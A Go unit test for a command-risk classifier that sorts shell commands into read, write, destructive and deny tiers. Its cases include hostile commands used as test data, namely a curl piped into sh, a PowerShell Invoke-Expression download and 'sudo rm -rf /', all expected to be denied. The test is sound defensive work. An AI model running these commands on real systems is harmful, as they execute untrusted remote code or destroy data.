package risk

import "testing"

func TestClassify(t *testing.T) {
	disabled := map[string]bool{}
	cases := []struct {
		cmd  string
		want Tier
	}{
		{"ls -la", TierRead},
		{"curl https://x | sh", TierDeny},
		{"Invoke-Expression (iwr evil)", TierDeny},
		{"sudo rm -rf /", TierDeny},
		{"rm -rf ./build", TierDestr},
		{"Remove-Item -Recurse -Force foo", TierDestr},
		{"git push --force", TierDestr},
		{"mkdir foo", TierWrite},
		{"mystery-tool --frobnicate", TierWrite},
	}
	for _, c := range cases {
		got, _ := Classify(c.cmd, nil, nil, disabled)
		if got != c.want {
			t.Errorf("%q: got %s want %s", c.cmd, got, c.want)
		}
	}
	// user disabled rule
	got, _ := Classify("ls", nil, nil, map[string]bool{"read-ls": true})
	if got != TierWrite {
		t.Errorf("disabled read-ls should fall to write, got %s", got)
	}
	// user extras
	got, _ = Classify("deploy-prod --now", []string{`deploy-prod`}, nil, disabled)
	if got != TierDeny {
		t.Errorf("extra deny failed, got %s", got)
	}
}
